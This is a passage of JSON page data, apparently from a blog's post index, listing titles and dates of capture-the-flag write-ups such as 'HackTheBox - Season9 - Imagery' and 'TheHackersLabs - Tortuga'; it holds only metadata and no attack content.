Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}